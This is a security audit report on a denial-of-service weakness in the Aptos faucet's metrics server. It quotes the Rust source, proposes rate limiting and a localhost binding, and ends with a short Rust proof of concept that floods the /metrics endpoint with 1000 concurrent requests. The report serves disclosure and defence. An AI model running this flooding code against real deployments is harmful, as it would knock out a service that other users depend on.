# Audit Report

## Title
Metrics Server Lacks Rate Limiting and Connection Throttling - Resource Exhaustion Vulnerability

## Summary
The `run_metrics_server` function in the aptos-faucet metrics server does not implement any request rate limiting, connection throttling, or concurrent request limits. An attacker can flood the `/metrics` endpoint with concurrent HTTP requests, causing unbounded memory allocation through repeated metrics gathering and encoding, leading to memory exhaustion and faucet service degradation.

## Finding Description

The metrics server implementation exposes a publicly accessible `/metrics` endpoint without any protection mechanisms: [1](#0-0) 

The server only applies CORS middleware and has no rate limiting, connection pooling, or concurrent request limiting. Each request to `/metrics` triggers a full metrics collection cycle: [2](#0-1) 

The `encode_metrics` function calls `gather_metrics()` which iterates through all registered Prometheus metrics, allocating a new buffer for each request: [3](#0-2) 

The `gather_metrics()` implementation shows this can be computationally expensive, with metric families potentially containing thousands of dimensions: [4](#0-3) 

The metrics server configuration provides no mechanism for limiting concurrent connections or request rates: [5](#0-4) 

In contrast, the main faucet API server implements concurrent request limiting using a Semaphore: [6](#0-5) 

The metrics server runs alongside the main faucet API in the same process: [7](#0-6) 

**Attack Path:**
1. Attacker identifies the metrics server endpoint (default port 9101)
2. Attacker sends thousands of concurrent HTTP GET requests to `/metrics`
3. Each request triggers full metrics gathering and buffer allocation
4. Memory consumption grows unbounded with concurrent requests
5. Process experiences memory exhaustion, affecting both metrics server and main faucet API
6. Faucet service becomes unresponsive or crashes

This breaks the **Resource Limits** invariant: "All operations must respect gas, storage, and computational limits."

## Impact Explanation

This vulnerability qualifies as **High Severity** under the Aptos bug bounty program criteria:

- **API crashes**: Memory exhaustion can crash the faucet service process
- **Validator node slowdowns**: While not directly affecting validator consensus, the faucet is a critical service for network usability and testnet operations

The impact includes:
1. **Service degradation**: Both metrics and main API endpoints become slow or unresponsive
2. **Memory exhaustion**: Unbounded concurrent requests can consume all available memory
3. **Complete service outage**: Process crash requires manual intervention to restart
4. **Denial of service**: Users cannot obtain testnet tokens during attack

The default configuration exposes the metrics server on `0.0.0.0:9101`, making it publicly accessible: [8](#0-7) 

## Likelihood Explanation

**Likelihood: HIGH**

The attack is trivial to execute:
- No authentication required for the `/metrics` endpoint
- No special tools needed - standard HTTP clients suffice
- The endpoint is publicly exposed by default
- Attack can be automated with simple scripts
- No rate limiting means immediate impact with modest resources

The vulnerability is actively exploitable in production deployments where the metrics server is enabled and publicly accessible.

## Recommendation

Implement connection throttling and rate limiting for the metrics server. The recommended fix includes:

1. **Add concurrent request limiting** using a Semaphore, similar to the main API server
2. **Implement rate limiting middleware** to prevent request flooding
3. **Add connection pooling limits** at the TCP layer
4. **Consider authentication** for the metrics endpoint if not already protected by infrastructure

Recommended code changes to `MetricsServerConfig`:

```rust
pub struct MetricsServerConfig {
    pub disable: bool,
    pub listen_address: String,
    pub listen_port: u16,
    // Add these fields:
    pub max_concurrent_requests: Option<usize>,
    pub rate_limit_per_second: Option<u32>,
}
```

Modify `run_metrics_server` to enforce limits using a Semaphore wrapper around the metrics handler, similar to the pattern used in the main faucet API.

Alternatively, restrict the metrics endpoint to localhost-only access (`127.0.0.1`) and require operators to use proper monitoring infrastructure (Prometheus scraping) with their own rate limits.

## Proof of Concept

```rust
// PoC: Flooding the metrics endpoint
// Run with: cargo run --bin metrics_flood_poc

use tokio;
use reqwest;

#[tokio::main]
async fn main() {
    let metrics_url = "http://localhost:9101/metrics";
    let concurrent_requests = 1000;
    
    println!("Starting DoS attack with {} concurrent requests", concurrent_requests);
    
    let mut handles = vec![];
    for i in 0..concurrent_requests {
        let url = metrics_url.to_string();
        let handle = tokio::spawn(async move {
            let start = std::time::Instant::now();
            match reqwest::get(&url).await {
                Ok(resp) => {
                    let bytes = resp.bytes().await.unwrap().len();
                    println!("Request {} completed in {:?}, {} bytes", i, start.elapsed(), bytes);
                },
                Err(e) => println!("Request {} failed: {}", i, e),
            }
        });
        handles.push(handle);
    }
    
    // Wait for all requests
    for handle in handles {
        handle.await.unwrap();
    }
    
    println!("Attack completed. Monitor memory usage of faucet service.");
}
```

**Expected Result**: Memory consumption spikes as concurrent requests accumulate. With sufficient concurrent requests, the faucet service process experiences memory pressure, slowdowns, or crashes.

**Notes**

The vulnerability exists because the metrics server was implemented without the same defensive protections as the main faucet API. While Prometheus metrics endpoints are typically considered low-risk, the combination of:
1. Public exposure (`0.0.0.0` binding)
2. Potentially large metric payloads (families with >2000 dimensions)
3. No rate limiting or concurrent request caps
4. Running in the same process as the critical faucet service

creates a viable attack vector for resource exhaustion. The fix should align the metrics server's protections with those already implemented in the main API server.

### Citations

**File:** crates/aptos-faucet/metrics-server/src/server.rs (L15-24)
```rust
pub fn encode_metrics(encoder: impl Encoder) -> Vec<u8> {
    let metric_families = gather_metrics();
    let mut buffer = vec![];
    encoder.encode(&metric_families, &mut buffer).unwrap();

    NUM_METRICS
        .with_label_values(&["total_bytes"])
        .inc_by(buffer.len() as u64);
    buffer
}
```

**File:** crates/aptos-faucet/metrics-server/src/server.rs (L26-29)
```rust
#[handler]
fn metrics() -> Vec<u8> {
    encode_metrics(TextEncoder)
}
```

**File:** crates/aptos-faucet/metrics-server/src/server.rs (L31-40)
```rust
pub fn run_metrics_server(
    config: MetricsServerConfig,
) -> impl Future<Output = Result<(), std::io::Error>> {
    let cors = Cors::new().allow_methods(vec![Method::GET]);
    Server::new(TcpListener::bind((
        config.listen_address.clone(),
        config.listen_port,
    )))
    .run(Route::new().at("/metrics", metrics).with(cors))
}
```

**File:** crates/aptos-faucet/metrics-server/src/gather_metrics.rs (L15-35)
```rust
pub fn gather_metrics() -> Vec<prometheus::proto::MetricFamily> {
    let metric_families = aptos_metrics_core::gather();
    let mut total: u64 = 0;
    let mut families_over_2000: u64 = 0;

    // Take metrics of metric gathering so we know possible overhead of this process
    for metric_family in &metric_families {
        let family_count = metric_family.get_metric().len();
        if family_count > 2000 {
            families_over_2000 = families_over_2000.saturating_add(1);
            let name = metric_family.get_name();
            warn!(
                count = family_count,
                metric_family = name,
                "Metric Family '{}' over 2000 dimensions '{}'",
                name,
                family_count
            );
        }
        total = total.saturating_add(family_count as u64);
    }
```

**File:** crates/aptos-faucet/metrics-server/src/config.rs (L6-19)
```rust
#[derive(Clone, Debug, Deserialize, Serialize)]
pub struct MetricsServerConfig {
    /// Whether to disable the metrics server.
    #[serde(default = "MetricsServerConfig::default_disable")]
    pub disable: bool,

    /// What address to listen on, e.g. localhost / 0.0.0.0
    #[serde(default = "MetricsServerConfig::default_listen_address")]
    pub listen_address: String,

    /// What port to listen on.
    #[serde(default = "MetricsServerConfig::default_listen_port")]
    pub listen_port: u16,
}
```

**File:** crates/aptos-faucet/metrics-server/src/config.rs (L26-32)
```rust
    fn default_listen_address() -> String {
        "0.0.0.0".to_string()
    }

    fn default_listen_port() -> u16 {
        9101
    }
```

**File:** crates/aptos-faucet/core/src/server/run.rs (L49-53)
```rust
    /// The maximum number of requests the tap instance should handle at once.
    /// This allows the tap to avoid overloading its Funder, as well as to
    /// signal to a healthchecker that it is overloaded (via `/`).
    pub max_concurrent_requests: Option<usize>,
}
```

**File:** crates/aptos-faucet/core/src/server/run.rs (L186-193)
```rust
        // Create a future for the metrics server.
        if !self.metrics_server_config.disable {
            main_futures.push(Box::pin(async move {
                run_metrics_server(self.metrics_server_config.clone())
                    .await
                    .context("Metrics server ended unexpectedly")
            }));
        }
```
